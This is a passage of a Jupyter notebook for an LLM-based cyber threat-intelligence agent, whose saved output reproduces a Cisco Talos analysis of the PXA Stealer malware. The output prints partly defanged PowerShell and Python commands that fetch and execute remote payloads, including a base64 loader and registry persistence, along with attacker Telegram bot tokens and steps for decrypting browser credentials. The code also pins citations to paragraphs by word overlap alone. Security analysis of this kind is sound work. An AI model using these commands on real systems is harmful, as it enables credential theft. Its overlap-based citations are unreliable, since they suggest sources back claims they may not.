        "      - Forecast potential evolutions in tactics or capabilities based on observed trends.\n",
        "\n",
        "    **PROMPT VARIABLES**:\n",
        "    - **Previous Context**: {chat_history}\n",
        "    - **Current Query**: {input}\n",
        "    - **Search Results**: {search_results}\n",
        "    - **Additional Crawled Data**: {crawled_results}\n",
        "    - **Current Date**: {current_date}\n",
        "\n",
        "    **RESPONSE REQUIREMENTS**:\n",
        "    - **Precision and Depth**: Maintain technical accuracy and detailed insights throughout the response.\n",
        "    - **Confidence Levels**: Clearly state the confidence level of each assessment, highlighting uncertainties where applicable.\n",
        "    - **Citation Accuracy**: Ensure citations are accurate, using the [Source Name](URL) format for each major claim; include media references when applicable.\n",
        "    - **Urgency and Priority**: Highlight any urgent findings or time-sensitive information.\n",
        "    - **Readable Structure**: Use clear headings, subheadings, and bullet points for easy navigation.\n",
        "    - **Address Gaps and Uncertainties**: Acknowledge any data limitations or uncertainties within the response.\n",
        "    - **Embedded Media Links**: Include links to relevant visuals with contextual descriptions.\n",
        "    - **Actionable and Context-Specific Recommendations**: Customize suggestions based on query-specific context.\n",
        "    - **Technical Integrity**: Retain technical rigor throughout, avoiding over-generalization.\n",
        "\n",
        "    **Highlighted Keywords**:\n",
        "    - **Threat Actor Group**\n",
        "    - **Cyber Gangs**\n",
        "    - **City**\n",
        "    - **Countries**\n",
        "    - **Geo-specific**\n",
        "    - **Malware**\n",
        "    - **Ransomware**\n",
        "    - **Vulnerability**\n",
        "    - **Exploit**\n",
        "    - **Phishing**\n",
        "    - **Data Breach**\n",
        "    - **Cyber Attack**\n",
        "    - **Incident Response**\n",
        "    - **MITRE ATT&CK**\n",
        "    - **Indicators of Compromise (IOCs)**\n",
        "    - **Command and Control (C2)**\n",
        "    - **Dates**\n",
        "    - **Times**\n",
        "    - **Trojans**\n",
        "\n",
        "    Generate a comprehensive, accurate response that addresses the query directly by synthesizing and presenting the latest, most relevant intelligence. Include insights into recent activities, incidents, and recommendations, supported by credible, source-backed evidence.\n",
        "\n",
        "    \"\"\"\n",
        "\n",
        "    prompt = ChatPromptTemplate.from_messages([(\n",
        "        \"system\", prompt_template\n",
        "    )])\n",
        "\n",
        "    chain = prompt | llm\n",
        "\n",
        "    current_date = datetime.now(pytz.utc).strftime(\"%Y-%m-%d %H:%M:%S UTC\")\n",
        "\n",
        "    # Enhanced search results formatting with media content handling\n",
        "    formatted_results = []\n",
        "    for result in search_results:\n",
        "        # Process media content\n",
        "        media_info = []\n",
        "        if result.media_content:\n",
        "            for media in result.media_content:\n",
        "                media_info.append({\n",
        "                    \"type\": media.get(\"type\", \"unknown\"),\n",
        "                    \"url\": media.get(\"url\", \"no url\"),\n",
        "                    \"description\": media.get(\"description\", \"\"),\n",
        "                    \"timestamp\": media.get(\"timestamp\", \"\")\n",
        "                })\n",
        "\n",
        "        # Create detailed result entry\n",
        "        result_str = (\n",
        "            f\"SOURCE ENTRY:\\n\"\n",
        "            f\"Title: {result.title}\\n\"\n",
        "            f\"Source: {result.source}\\n\"\n",
        "            f\"URL: {result.url}\\n\"\n",
        "            f\"Date: {result.date or 'Not specified'}\\n\"\n",
        "            f\"Content: {highlight_keywords(result.snippet, ['Threat Actor Group', 'Cyber Gangs', 'City', 'Countries', 'Geo-specific', 'Malware', 'Ransomware', 'Vulnerability', 'Exploit', 'Phishing', 'Data Breach', 'Cyber Attack', 'Incident Response', 'MITRE ATT&CK', 'Indicators of Compromise (IOCs)', 'Command and Control (C2)', 'Dates', 'Times', 'Trojans'])}\"\n",
        "        )\n",
        "\n",
        "        # Add media information if available\n",
        "        if media_info:\n",
        "            result_str += \"Media Content:\\n\"\n",
        "            for media in media_info:\n",
        "                result_str += (\n",
        "                    f\"- Type: {media['type']}\\n\"\n",
        "                    f\"  URL: {media['url']}\\n\"\n",
        "                    f\"  Description: {media['description']}\\n\"\n",
        "                    f\"  Timestamp: {media['timestamp']}\\n\"\n",
        "                )\n",
        "\n",
        "        result_str += \"-\" * 50 + \"\\n\"\n",
        "        formatted_results.append(result_str)\n",
        "\n",
        "    # Format crawled results with hyperlink extraction\n",
        "    formatted_crawled_results = []\n",
        "    for crawled_result in crawled_results:\n",
        "        for item in crawled_result:\n",
        "            if 'content' in item and 'links' in item:\n",
        "                formatted_crawled_results.append(f\"Content: {item['content']}\\nLinks: {item['links']}\\n\")\n",
        "                # Extract hyperlinks from content\n",
        "                hyperlinks = extract_hyperlinks(item['content'])\n",
        "                if hyperlinks:\n",
        "                    formatted_crawled_results.append(f\"Hyperlinks: {hyperlinks}\\n\")\n",
        "            else:\n",
        "                print(\"Missing 'content' or 'links' key in crawled result item:\", item)\n",
        "\n",
        "    # Generate response\n",
        "    response = chain.invoke({\n",
        "        \"input\": state[\"messages\"][-1][\"content\"],\n",
        "        \"search_results\": \"\\n\".join(formatted_results),\n",
        "        \"crawled_results\": \"\\n\".join(formatted_crawled_results),\n",
        "        \"chat_history\": chat_history,\n",
        "        \"current_date\": current_date\n",
        "    })\n",
        "\n",
        "    # Process response and ensure citations\n",
        "    processed_response = ensure_citations(response.content, search_results)\n",
        "\n",
        "    # Display media content\n",
        "    for result in search_results:\n",
        "        if hasattr(result, 'media') and result.media:\n",
        "            for media_url in result.media:\n",
        "                if is_valid_image_url(media_url):\n",
        "                    display(Image(url=media_url, width=400))\n",
        "\n",
        "    # Add crawled images\n",
        "    for crawled_result in crawled_results:\n",
        "        if crawled_result and 'valid_images' in crawled_result:\n",
        "            for img_url in crawled_result['valid_images']:\n",
        "                display(Image(url=img_url, width=400))\n",
        "\n",
        "    state[\"messages\"].append({\"role\": \"assistant\", \"content\": processed_response})\n",
        "    state[\"memory\"] = {\n",
        "        \"chat_history\": chat_history + f\"\\nHuman: {state['messages'][-2]['content']}\\nAI: {processed_response}\"\n",
        "    }\n",
        "    return state\n",
        "\n",
        "def ensure_citations(text: str, search_results: List[SearchResult]) -> str:\n",
        "    paragraphs = text.split('\\n\\n')\n",
        "    cited_paragraphs = []\n",
        "\n",
        "    if not search_results:\n",
        "        print(\"WARNING: No search results available for citation.\")\n",
        "        return text\n",
        "\n",
        "    for paragraph in paragraphs:\n",
        "        if not any(result.url in paragraph for result in search_results) and not paragraph.startswith('**'):\n",
        "            most_relevant_source = max(search_results, key=lambda x: len(set(paragraph.lower().split()) & set(x.snippet.lower().split())))\n",
        "            paragraph += f' {format_source_link(most_relevant_source.source, most_relevant_source.url)}'\n",
        "        cited_paragraphs.append(paragraph)\n",
        "\n",
        "    if not any(p.startswith('**Sources**') for p in cited_paragraphs):\n",
        "        sources = set(f\"- {format_source_link(result.source, result.url)}\" for result in search_results)\n",
        "        cited_paragraphs.append(\"**Sources**\\n\" + \"\\n\".join(sources))\n",
        "\n",
        "    return '\\n\\n'.join(cited_paragraphs)\n",
        "\n",
        "def format_source_link(source: str, url: str) -> str:\n",
        "    return f\"[{source}]({url})\"\n",
        "\n",
        "def extract_hyperlinks(content: str) -> List[str]:\n",
        "    import re\n",
        "    pattern = re.compile(r'http[s]?://(?:[a-zA-Z]|[0-9]|[$-_@.&+]|[!*,]|(?:%[0-9a-fA-F][0-9a-fA-F]))+')\n",
        "    return pattern.findall(content)\n",
        "\n",
        "# Workflow definition\n",
        "from langgraph.graph import StateGraph, END\n",
        "\n",
        "workflow = StateGraph(AgentState)\n",
        "workflow.add_node(\"execute_searches\", execute_searches)\n",
        "workflow.add_node(\"generate_response\", generate_response)\n",
        "workflow.add_edge(\"execute_searches\", \"generate_response\")\n",
        "workflow.add_edge(\"generate_response\", END)\n",
        "workflow.set_entry_point(\"execute_searches\")\n",
        "graph = workflow.compile()\n",
        "\n",
        "# Asynchronous function to run the agent\n",
        "async def run_agent(query: str, memory: Optional[Dict[str, Any]] = None) -> AgentState:\n",
        "    state = AgentState(messages=[{\"role\": \"human\", \"content\": query}], memory=memory or {})\n",
        "    result = await graph.ainvoke(state)\n",
        "    return result"
      ],
      "metadata": {
        "id": "YKgGbgXaW0UL"
      },
      "execution_count": 18,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "if __name__ == \"__main__\":\n",
        "    query = \"Latest Cyber Incidents on LunarsGo Threat Actor?\"\n",
        "    result = asyncio.run(run_agent(query))\n",
        "    for message in result[\"messages\"]:\n",
        "        if message[\"role\"] == \"assistant\":\n",
        "            print(\"Cyber AI Copilot Response:\")\n",
        "            print(message[\"content\"])"
      ],
      "metadata": {
        "id": "GwKcWCaOs2vT",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 1000
        },
        "outputId": "49b62ff6-a966-4c6b-ec0e-0f8032d8c3f6"
      },
      "execution_count": 20,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "DEBUG: Starting Exa Search with query: Latest Cyber Incidents on LunarsGo Threat Actor? 2024 OR 2024 recent\n",
            "DEBUG: Raw results from Exa Search: Title: New PXA Stealer targets government and education sectors for sensitive information\n",
            "URL: https://blog.talosintelligence.com/new-pxa-stealer/\n",
            "ID: https://blog.talosintelligence.com/new-pxa-stealer/\n",
            "Score: 0.14615356922149658\n",
            "Published Date: 2024-11-14T00:00:00.000Z\n",
            "Author: Joey Chen\n",
            "Image: https://blog.talosintelligence.com/content/images/size/w1200/2024/11/Screenshot-2024-11-12-at-3.17.48-PM.png\n",
            "Extras None\n",
            "Subpages: None\n",
            "Text: Cisco Talos Blog\n",
            "[](https://talosintelligence.com/)\n",
            "*\n",
            "[Intelligence Center](https://talosintelligence.com/reputation)\n",
            "+\n",
            "[Intelligence Center](https://talosintelligence.com/reputation)\n",
            "+ BACK\n",
            "+ [Intelligence Search](https://talosintelligence.com/reputation_center)\n",
            "+ [Email & Spam Trends](https://talosintelligence.com/reputation_center/email_rep)\n",
            "*\n",
            "[Vulnerability Research](https://talosintelligence.com/vulnerability_info)\n",
            "+\n",
            "[Vulnerability Information](https://talosintelligence.com/vulnerability_info)\n",
            "+ BACK\n",
            "+ [Vulnerability Reports](https://talosintelligence.com/vulnerability_reports)\n",
            "+ [Microsoft Advisories](https://talosintelligence.com/ms_advisories)\n",
            "*\n",
            "[Incident Response](https://talosintelligence.com/incident_response)\n",
            "*\n",
            "[Blog](https://blog.talosintelligence.com/)\n",
            "*\n",
            "[Support](https://support.talosintelligence.com/)\n",
            "More\n",
            "* Security Resources\n",
            "Security Resources\n",
            "+ BACK\n",
            "Security Resources\n",
            "+ [Open Source Security Tools](https://talosintelligence.com/software)\n",
            "+ [Intelligence Categories Reference](https://talosintelligence.com/categories)\n",
            "+ [Secure Endpoint Naming Reference](https://talosintelligence.com/secure-endpoint-naming)\n",
            "* Media\n",
            "Media\n",
            "+ BACK\n",
            "Media\n",
            "+ [Talos Intelligence Blog](https://blog.talosintelligence.com/)\n",
            "+ [Threat Source Newsletter](https://blog.talosintelligence.com/category/threat-source-newsletter/)\n",
            "+ [Beers with Talos Podcast](https://talosintelligence.com/podcasts/shows/beers_with_talos)\n",
            "+ [Talos Takes Podcast](https://talosintelligence.com/podcasts/shows/talos_takes)\n",
            "+ [Talos Videos](https://www.youtube.com/channel/UCPZ1DtzQkStYBSG3GTNoyfg/featured)\n",
            "* Company\n",
            "Company\n",
            "+ BACK\n",
            "Company\n",
            "+ [About Talos](https://talosintelligence.com/about)\n",
            "+ [Careers](https://talosintelligence.com/careers)\n",
            "New PXA Stealer targets government and education sectors for sensitive information\n",
            "By [Joey Chen](https://blog.talosintelligence.com/author/joey/), [Alex Karkins](https://blog.talosintelligence.com/author/alex/), [Chetan Raghuprasad](https://blog.talosintelligence.com/author/chetan-raghuprasad/)\n",
            "Thursday, November 14, 2024 06:00\n",
            "[Threat Spotlight](https://blog.talosintelligence.com/category/threat-spotlight/) [Stealer](https://blog.talosintelligence.com/category/stealer/)\n",
            "* Cisco Talos discovered a new information stealing campaign operated by a Vietnamese-speaking threat actor targeting government and education entities in Europe and Asia.\n",
            "* We discovered a new Python program called PXA Stealer that targets victims’ sensitive information, including credentials for various online accounts, VPN and FTP clients, financial information, browser cookies, and data from gaming software.\n",
            "* PXA Stealer has the capability to decrypt the victim’s browser master password and uses it to steal the stored credentials of various online accounts.\n",
            "* The attacker has used complex obfuscation techniques for the batch scripts used in this campaign.\n",
            "* We discovered the attacker selling credentials and tools in the Telegram channel “Mua Bán Scan MINI,” which is where the [CoralRaider](https://blog.talosintelligence.com/coralraider-targets-socialmedia-accounts/) adversary operates, but we are not sure if the attacker belongs to the CoralRaider threat group or another Vietnamese cybercrime group.\n",
            "Victimology and targeted information\n",
            "The attacker is targeting the education sector in India and government organizations in European countries, including Sweden and Denmark, based on Talos telemetry data.\n",
            "The attacker’s motive is to steal the victim’s information, including credentials for various online accounts, browser login data, cookies, autofill information, credit card details, data from various cryptocurrency online and desktop wallets, data from installed VPN clients, gaming software accounts, chat messengers, password managers, and FTP clients.\n",
            "Attacker’s infrastructure\n",
            "Talos discovered that the attacker was hosting malicious scripts and the stealer program on a domain, tvdseo[.]com, in the directories “/file”, “/file/PXA/”, “/file/STC/”, and “/file/Adonis/”. The domain belongs to a Vietnamese professional search engine optimization (SEO) service provider; however, we are not certain whether the attacker has compromised the domain to host the malicious files or has subscribed to get legitimate access while still using it for their malicious purposes.\n",
            "We found that the attacker is using the Telegram bot for exfiltrating victims’ data. Our analysis of the payload, PXA Stealer, disclosed a few Telegram bot tokens and the chat IDs – controlled by the attacker.\n",
            "Attacker - controlled Telegram b ot t oken\n",
            "7545164691:AAEJ 4E2f-4KZDZrLID8hSRSJmPmR1h-a2M4\n",
            "7414494371:AAGgbY 4XAvxTWFgAYiAj6OXVJOVrqgjdGVs\n",
            "Attacker - controlled Telegram c hat ID s\n",
            "-1002174636072\n",
            "-1002150158011\n",
            "-4559798560\n",
            "-4577199885\n",
            "-4575205410\n",
            "Attacker’s underground activities\n",
            "We identified attacker’s Telegram account “Lone None,” which was hardcoded in the PXA Stealer program and analyzed various details of the account, including the icon of Vietnam’s national flag and a picture of the emblem for Vietnam’s Ministry of Public Security, which aligns with our assessment that the attacker is of Vietnamese origin. Also, we found Vietnamese comments in the PXA Stealer program, which further strengthen our assessment.\n",
            "The attacker’s Telegram account has biography data that includes a link to a private antivirus checker website that allows users or buyers to assess the detection rate of a malware program. This website provides a platform for potential threat actors to evaluate the effectiveness and stealth capabilities of the malware before purchasing it, indicating a sophisticated level of service and professionalism in the threat actor's operations.\n",
            "We also discovered that the attacker is active in an underground Telegram channel, “Mua Bán Scan MINI,” mainly selling Facebook accounts, Zalo accounts, SIM cards, credentials, and money laundry data. Talos observed that this Vietnamese actor is also seen in the Telegram group in which the CoralRaider actor operates. However, we are not certain whether the actor is a member of the CoralRaider gang or another Vietnamese cybercrime group.\n",
            "Talos discovered that the attacker is also promoting another underground Telegram channel, “Cú Black Ads – Dropship,\" by sharing a few automation tools to manage large numbers of user accounts in their channel and conducting the exchanging or selling of information related to social media accounts, proxy services, and a batch account creator tool.\n",
            "The tools shared by the attacker in the group are automated utilities designed to manage several user accounts. These tools include a Hotmail batch creation tool, an email mining tool, and a Hotmail cookie batch modification tool. The compressed packages provided by the threat actor often contain not only the executable files for these tools but also their source code, allowing users to modify them as needed.\n",
            "Hotmail batch creation tool from telegram channel.\n",
            "Hotmail cookie batch modification tool from telegram channel.\n",
            "We found that the attacker is not sharing all the tools for free, and some of them require users to send a unique key back to the Telegram channel administrator for software activation. This process ensures that only those who have been vetted or have paid for the tool can access its full functionality. We also discovered that these tools are distributed on other websites, such as aehack[.]com, highlighting that they are selling the tools. Additionally, a [YouTube](https://www.youtube.com/watch?v=nBLueYeRugg) channel exists that provides tutorials on how to use these tools, further facilitating their widespread use and demonstrating the organized efforts to market and instruct potential users on their application.\n",
            "Infection Chain\n",
            "The attacker gains initial access by sending a phishing email with a ZIP file attachment, according to our telemetry data. The ZIP file contains a malicious loader executable file compiled in Rust language and a hidden folder called Photos. The hidden folder has other recurring folders, such as Documents and Images, that contain obfuscated Windows batch scripts and a decoy PDF document.\n",
            "When a victim extracts the attachment ZIP file, the hidden folder and the malicious Rust loader executable are dropped onto the victim machine. When the malicious Rust loader executable is run by the victim, it loads and executes multiple obfuscated batch scripts that are in the dropped hidden folders.\n",
            "We deobfuscated the Windows batch scripts using [CyberChef](https://gchq.github.io/CyberChef/), with each step in the process being crucial and requiring precise execution to achieve accurate deobfuscation. First, we employed regular expressions (regex) to filter out random characters consisting of uppercase and lowercase letters (A to Z). These random strings ranged in length from six to nine characters and were enclosed within “%” symbols. Next, we filtered out the “^” symbols and removed any remaining uppercase and lowercase letters (A to Z) as well as special characters “_,” /’(?),” “$,” “#,” and “[].” Finally, we eliminated the “%” symbols and we were able to successfully deobfuscate the scripts and reveal their PowerShell commands.\n",
            "Snippet of the o bfuscated batch script Snippet of the deobfuscated batch script\n",
            "The batch scripts execute PowerShell commands simultaneously, performing the following activities on the victim machine:\n",
            "* Opens a decoy PDF document of a Glassdoor job application form.\n",
            "* Downloads a portable Python 3.10 package archive masquerading as “synaptics.zip”, which is hosted on the attacker-controlled domain through the hardcoded URL “hxxps[://]tvdseo[.]com/file/synaptics[.]zip”, and saves it in the user profile’s temporary folder as well as in the public user’s folder with the random file names and extracts them.\n",
            "C:\\WINDOWS\\system32\\cmd[.]exe /S /D /c echo [Net[.]ServicePointManager]::SecurityProtocol = [Net[.]SecurityProtocolType]::Tls12; (New-Object -TypeName System[.]Net[.]WebClient).DownloadFile('hxxps[://]tvdseo[.]com/file/synaptics[.]zip', [System[.]IO[.]Path]::GetTempPath() + 'EAnLaxUKaI[.]zip')\n",
            "C:\\WINDOWS\\system32\\cmd[.]exe /S /D /c echo [Net[.]ServicePointManager]::SecurityProtocol = [Net[.]SecurityProtocolType]::Tls12; (New-Object -TypeName System[.]Net[.]WebClient).DownloadFile('hxxps[://]tvdseo[.]com/file/synaptics[.]zip', 'C:\\Users\\Public\\oZHyMUy4qk[.]zip')\n",
            "C:\\WINDOWS\\system32\\cmd[.]exe /S /D /c echo $dst = [System[.]IO[.]Path]::Combine([System[.]Environment]::GetFolderPath('LocalApplicationData'), 'EAnLaxUKaI'); Add-Type -AssemblyName System[.]IO[.]Compression[.]FileSystem; if (Test-Path $dst) { Remove-Item -Recurse -Force $dst\\* } else { New-Item -ItemType Directory -Force $dst } ; [System[.]IO[.]Compression[.]ZipFile]::ExtractToDirectory([System[.]IO[.]Path]::Combine([System[.]IO[.]Path]::GetTempPath(), 'EAnLaxUKaI[.]zip'), $dst)\n",
            "C:\\WINDOWS\\system32\\cmd[.]exe /S /D /c echo Add-Type -AssemblyName System[.]IO[.]Compression[.]FileSystem; [System[.]IO[.]Compression[.]ZipFile]::ExtractToDirectory('C:/Users/Public/oZHyMUy4qk[.]zip', 'C:/Users/Public/oZHyMUy4qk')\n",
            "* Then, it creates and runs a Windows shortcut file with the file name “WindowsSecurity.lnk”, configuring a base64-encoded command as a command line argument in the user profile’s temporary folder and configures the “Run” registry key with the path of the shortcut file to establish persistence.\n",
            "C:\\WINDOWS\\system32\\cmd[.]exe /S /D /c echo $s = $payload = import base64;exec(base64.b64decode('aW1wb3J0IHVybGxpYi5yZXF1ZXN0O2ltcG9ydCBiYXNlNjQ7ZXhlYyhiYXNlNjQuYjY0ZGVjb2RlKHVybGxpYi5yZXF1ZXN0LnVybG9wZW4oJ2h0dHBzOi8vdHZkc2VvLmNvbS9maWxlL1BYQS9QWEFfUFVSRV9FTkMnKS5yZWFkKCkuZGVjb2RlKCd1dGYtOCcpKSk='));$obj = New-Object -ComObject WScript.Shell;$link = $obj.CreateShortcut($env:LOCALAPPDATA\\WindowsSecurity.lnk);$link.WindowStyle = 7;$link.TargetPath = $env:LOCALAPPDATA\\EAnLaxUKaI\\synaptics.exe;$link.IconLocation = C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe,13;$link.Arguments = -c `$payload`\";$link.Save()\n",
            "C:\\WINDOWS\\system32\\cmd[.]exe /S /D /c echo New-ItemProperty -Path 'HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'Windows Security' -PropertyType String -Value 'C:\\Windows\\Explorer.EXE C:\\Users\\Marsi\\AppData\\Local\\WindowsSecurity.lnk' -Force\n",
            "* The Windows shortcut file with a single-line Python script using a disguised portable Python executable downloads a base64-encoded Python program from a remote server. The downloaded program contains instructions to disable the antivirus programs on the victim’s machine.\n",
            "cmd[.]exe /c start \"\" /min C:\\Users\\Public\\oZHyMUy4qk\\synaptics[.]exe -c \"import urllib[.]request;import base64;exec(base64.b64decode(urllib[.]request[.]urlopen('hxxps[://]tvdseo[.]com/file/PXA/PXA_PURE_ENC')[.]read()[.]decode('utf-8')))\"\n",
            "* Next, the batch script continues to execute another PowerShell command that downloads the PXA Stealer Python program and executes it with the masqueraded portable Python executable “synaptics.exe” on the victim’s machine.\n",
            "cmd[.]exe /c start /min C:\\Users\\Public\\oZHyMUy4qk\\synaptics[.]exe -c import urllib[.]request;import base64;exec(base64.b64decode(urllib[.]request[.]urlopen('hxxps[://]tvdseo[.]com/file/PXA/PXA_BOT')[.]read()[.]decode('utf-8')))\n",
            "* Another batch script called “WindowsSecurity.bat” is dropped in the Windows startup folder of the victim’s machine to establish persistence, which has the command to download and execute the PXA Stealer Python program shown in the earlier paragraph.\n",
            "PXA Stealer targets victims’ sensitive data\n",
            "PXA Stealer is a Python program that has extensive capabilities targeting a variety of data on the victim’s machine.\n",
            "When the PXA Stealer is executed, it kills a variety of processes from a hardcoded list, including endpoint detection software, network capture and analysis process, VPN software, cryptocurrency wallet applications, file transfer client applications, and web browser and instant messaging application processes by executing “task kill” commands.\n",
            "Detection evasive function of PXA Stealer.\n",
            "The stealer has the capability of decrypting the browser master key, which is a cryptographic key used by web browsers like Google Chrome and other Chromium-based browsers to protect sensitive information, including stored passwords, cookies, and other data in an encrypted form on the local system. The stealer accesses the master key file “Local State” located in the browser folder of the user’s profile directory, which contains the information of the encryption key used to encrypt the user data stored in the “Login Data” file, and decrypts it using the “CryptUnprotectData” function. This allows the attacker to gain access to the stored credentials and other sensitive browser information.\n",
            "Browser master key decryption function of PXA Stealer.\n",
            "The stealer also attempts to decrypts the master key that is stored in the key4.db file. Key4.db is a database used by Firefox (and some other Mozilla-based browsers) to store encryption keys, particularly the master key that encrypts sensitive data, such as saved passwords. The “getKey” function of the stealer is designed to extract and decrypt keys from the key4.db file using either AES or 3DES encryption methods, depending on the encryption used in the stored key.\n",
            "Browser master key decryption function of PXA Stealer.\n",
            "The stealer attempts to retrieve user profiles paths from the profiles.ini file of browser applications, including Mozilla Firefox, Pale Moon, SeaMonkey, Waterfox, Mercury, k-Melon, IceDragon, Cyberfox, and BlackHaw for further processing, such as extracting saved passwords or other user data.\n",
            "The stealer collects the victim’s login information from the browser’s login data file. The function “get_ch_login_data” of the stealer extracts login data, including URLs, usernames, and passwords, from the database “login_db”, which stores login information. The extracted login information is formatted into a string that includes the URL, username, decrypted password, browser, and profile.\n",
            "For each login entry in the browser login database, the function checks if the URL contains any important keywords that are hardcoded in the stealer program, and if a match is found, the login information is saved in a separate file named “Important_Logins.txt” located in the “Browsers Data” folder within the user’s profile temporary directory. The function saves all the results to “All_Passwords.txt” in the “Browsers Data” folder for other login data found in the database.\n",
            "Login credentials stealer function of PXA Stealer.\n",
            "The stealer executes another function, “get_ch_cookies”, to extract cookies from a specified browser's cookie database, decrypt them, and save the results to a file. First, it checks if the cookies database file exists in the specified profile directory and unlocks the cookies database file. The database file is then copied to the temporary folder and is processed by executing an SQL query to retrieve cookie information, including host key, name, path, encrypted value, expiration time, secure flag, and HTTP-only flag from the cookies database file.\n",
            "If any Facebook cookies are found, they are concatenated to a single string called \"fb_formatted\", and it calls another function, \"ADS_Checker()\", to check for ads based on the Facebook cookies, and the results are written to a file called \"Facebook_Cookies.txt”. Any other cookie information is written to a text file named after the browser and the profile. Finally, the function removes the temporary cookie database file.\n",
            "Browser cookies stealer function of PXA Stealer.\n",
            "In another sample of the stealer, for the browsers Chrome, Chrome SxS, and Chrome(x86), it downloads and executes a cookie stealer JavaScript through the URL hxxps://tvdseo[.]com/file/PXA/Cookie_Ext.zip. The cookie stealer JavaScript connects to the Telegram bot with the token, and the chat ID hardcoded in the script collects the cookies and sends them to the attacker’s Telegram bot through the POST method.\n",
            "Browser cookie stealer JavaScript.\n",
            "Next, the stealer targets the victim’s credit card information stored in the browser database “webappsstore.sqlite”. The function extracts and decrypts saved credit card information from a browser's web data database. It checks if the cards database file \"cards_db\" exists and copies them to the user’s profile temporary folder. It executes a SQL query to retrieve credit card information including name on card, expiration month/year, encrypted card number, and date modified. Then it decrypts the encrypted card number using the function “decrypt_ch_value” with the help of the decrypted master key. It writes the cards’ information to a text file and names it after the browser and the profile. Finally, it gets the count of credit card information that was found and deletes the temporary copy of the “cards_db” file.\n",
            "Credit card data stealer function of PXA Stealer.\n",
            "The stealer extracts and saves the autofill form data from a browser's database to a text file with the file name format of “$browser_$profile.txt” in a folder called “AutoFills” in browser profile location.\n",
            "Autofill data stealer function of PXA Stealer.\n",
            "The stealer also extracts and validates Discord tokens stored in various browsers or Discord applications. It checks for the stored encrypted Discord tokens in the different browser database files and also Discord-specific applications files of Discord, Discord Canary, Lightcord, and Discord PTB on the victim's machine by searching for strings using regular expression \"r\"dQw4w9WgXcQ:[^.*\\['(.*)'\\].*$][^\\\"]*\")\". Once the encrypted tokens are found, it decrypts them with the function “decrypt_dc_tokens()” using the extracted master key that was used to encrypt the tokens from the \"Local State\" file. Then, it validates the decrypted Discord tokens to check if it is a legitimate Discord token and stores it by associating it with the browser name. Besides searching for the encrypted tokens, the function also looks for unencrypted Discord tokens by searching strings that match the regular expression pattern \"[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}\" for standard tokens and \"mfa\\.[\\w-]{84}\" for multi-factor authentication (MFA) tokens in \".log\" and \".ldb\" files in the levelDB directory of Discord applications or web browsers where the structured key-value data is stored in levelDB database format.\n",
            "Discord token stealer function of PXA Stealer.\n",
            "The stealer executes another function to extract the user information from the MinSoftware application database. It searches for the database file \"db_maxcare.sqlite\" file on the victim machine folders, including Desktop, Documents, Downloads, OneDrive and in the logical partitions with the drive letters \"D:\\\" and \"E:\\\". Once found, it executes a SQL query to search in the accounts table of the database file and extracts the following data:\n",
            "* uid: User identifier.\n",
            "* pass: User's password.\n",
            "* fa2: Two-factor authentication data.\n",
            "* email: The user's email address.\n",
            "* passmail: The email password.\n",
            "* cookie1: Likely a session or authentication cookie.\n",
            "* token: Likely an authentication token.\n",
            "* info: Account information.\n",
            "MinSoftware application data stealer function of PXA Stealer.\n",
            "The stealer also has the functionalities for interacting with Facebook Ads Manager and Graph API using a session authenticated via cookies.\n",
            "* It takes a Facebook cookie and parses it for the session information, such as “c_user”, and attempts to access the token.\n",
            "* Retrieves and formats the details about the user's ad accounts, such as account status, currency, balance, spend cap, and amount spent.\n",
            "* Gets the list of the user's Facebook pages, including page name, link, likes, followers, and verification status.\n",
            "* It retrieves a list of groups with administrative users.\n",
            "* It extracts Business Manager IDs associated with the account and retrieves ad account information under each Business Manager.\n",
            "* It uses Facebook data to determine ad account limits for a Business Manager.\n",
            "* It extracts the token from Facebook mobile pages to facilitate authenticates requests.\n",
            "Facebook data stealer function of PXA Stealer.\n",
            "After collecting the targeted victim's data, including the login data, browser cookies, autofill information, credit card details, Facebook ads account data, cryptocurrency wallet data, Discord token details, and MinSoft application data, the stealer creates a ZIP archive of all the files in the user profile’s temporary folder with the file name format \"CountryCode_Victim's public IP Computername.zip\", with a high compression level of value nine.\n",
            "While creating the archive and navigating the targeted folders, the stealer excludes some of the directories, including user_data, emoji, tdummy, dumps, webview, update-cache, GPUCache, DawnCache, temp, Code Cache, and Cache. It also attempts to rename each file while adding them to the archive. The archive is exfiltrated to the actor’s Telegram bot. After exfiltrating the victim’s data, the stealer deletes the folders that contained the collected user data.\n",
            "Exfiltration function of PXA Stealer.\n",
            "Coverage\n",
            "[Cisco Secure Endpoint](https://www.cisco.com/c/en/us/products/security/amp-for-endpoints/index.html) (formerly AMP for Endpoints) is ideally suited to prevent the execution of the malware detailed in this post. Try Secure Endpoint for free [here.](https://www.cisco.com/c/en/us/products/security/amp-for-endpoints/free-trial.html?utm_campaign=amp-free-trial&utm_content=amp-free-trial&utm_medium=web-referral%3Futm_source%3Dcisco&utm_term=pgm-talos-trial)\n",
            "[Cisco Secure Web Appliance](https://www.cisco.com/c/en/us/products/security/web-security-appliance/index.html) web scanning prevents access to malicious websites and detects malware used in these attacks.\n",
            "[Cisco Secure Email](https://www.cisco.com/c/en/us/products/security/email-security/index.html) (formerly Cisco Email Security) can block malicious emails sent by threat actors as part of their campaign. You can try Secure Email for free [here](https://www.cisco.com/c/en/us/products/security/cloud-mailbox-defense?utm_campaign=cmd-free-trial-request&utm_medium=web-referral&utm_source=cisco&utm_term=pgm-talos-trial).\n",
            "[Cisco Secure Firewall](https://www.cisco.com/c/en/us/products/security/firewalls/index.html) (formerly Next-Generation Firewall and Firepower NGFW) appliances such as [Threat Defense Virtual](https://www.cisco.com/c/en/us/products/collateral/security/firepower-ngfw-virtual/datasheet-c78-742858.html), [Adaptive Security Appliance](https://www.cisco.com/c/en/us/products/security/adaptive-security-appliance-asa-software/index.html) and [Meraki MX](https://meraki.cisco.com/products/appliances) can detect malicious activity associated with this threat.\n",
            "[Cisco Secure Malware Analytics](https://www.cisco.com/c/en/us/products/security/threat-grid/index.html) (Threat Grid) identifies malicious binaries and builds protection into all Cisco Secure products.\n",
